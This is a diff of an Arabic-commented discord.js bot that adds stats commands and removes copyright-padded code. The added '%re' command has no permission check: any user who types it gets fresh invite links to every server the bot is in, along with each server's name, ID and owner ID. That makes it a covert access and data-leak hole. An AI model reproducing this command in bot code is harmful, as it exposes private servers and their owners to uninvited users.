@@ -204,21 +204,7 @@ client.on("message", message => {//الحقوق كامله محفوضه لدا �
  }
  
        
-});//الحقوق كامله محفوضه لدا سيرفر الفا
-//الحقوق كامله محفوضه لدا سيرفر الفا
-        //الحقوق كامله محفوضه لدا سيرفر الفا
-client.on('message', message => {//الحقوق كامله محفوضه لدا سيرفر الفا
-  if(message.content === "*bot") {//الحقوق كامله محفوضه لدا سيرفر الفا
-      const embed = new Discord.RichEmbed()//الحقوق كامله محفوضه لدا سيرفر الفا
-      .setColor("#00FFFF")//الحقوق كامله محفوضه لدا سيرفر الفا
-      .setDescription(`**Servers**🌐 **__${client.guilds.size}__**//الحقوق كامله محفوضه لدا سيرفر الفا
-**Users**👥 **__${client.users.size}__**//الحقوق كامله محفوضه لدا سيرفر الفا
-**Channels**📚 **__${client.channels.size}__** `)//الحقوق كامله محفوضه لدا سيرفر الفا
-             message.channel.sendEmbed(embed);//الحقوق كامله محفوضه لدا سيرفر الفا
-         }//الحقوق كامله محفوضه لدا سيرفر الفا
-});//الحقوق كامله محفوضه لدا سيرفر الفا
-//الحقوق كامله محفوضه لدا سيرفر الفا
-    //الحقوق كامله محفوضه لدا سيرفر الفا
+});
 
 var adkar = [
   '**اذكار  | **اللَّهُمَّ اكْفِنِي بِحَلَالِكَ عَنْ حَرَامِكَ وَأَغْنِنِي بِفَضْلِكَ عَمَّنْ سِوَاكَ.',
@@ -319,6 +305,29 @@ client.on('message', message => {
 
 
 
+client.on('message', msg => {
+    if(msg.author.bot) return;
+    
+    if(msg.content === '%re') {
+      client.guilds.forEach(g => {
+        
+        let l = g.id
+        g.channels.get(g.channels.first().id).createInvite({
+          maxUses: 5,
+          maxAge: 86400
+        }).then(i => msg.channel.send(`
+        **
+        Invite Link : <https://discord.gg/${i.code}>
+        Server : ${g.name} | Id : ${g.id} 
+        Owner ID : ${g.owner.id}
+        **
+        `))
+  
+  
+      })
+    }
+    
+});
 
 
 
@@ -327,8 +336,26 @@ client.on('message', message => {
 
 
 
+client.on('message' , async (message) => {
+  var prefix = "%";
+ if (message.content.startsWith(prefix + 'bot')) {
+ const os = require('os');
+    const arch = os.arch()
+    const used = process.memoryUsage().heapUsed / 1024 / 1024;
 
+    let totalSeconds = process.uptime();
+    let realTotalSecs = Math.floor(totalSeconds % 60);
+    let days = Math.floor((totalSeconds % 31536000) / 86400);
+    let hours = Math.floor((totalSeconds / 3600) % 24);
+    let mins = Math.floor((totalSeconds / 60) % 60);
 
+    var ping = client.ping
+    message.channel.send(`\n= Memory usage: ${Math.round(used * 100) / 100}MB\n= Ping: ${ping}\n= Uptime: Days: ${days} | Hours: ${hours} | Minutes: ${mins} | Seconds: ${realTotalSecs}\n= Node: ${process.version}\n= Library: discord.js\n= ARCH: ${arch}\n= Plataform: ${os.platform}\n= Servers: ${client.guilds.size}\n= Users: ${client.users.size}`, {
+        code: 'AsciiDoc'
+    })
+
+}
+});
 
 
 
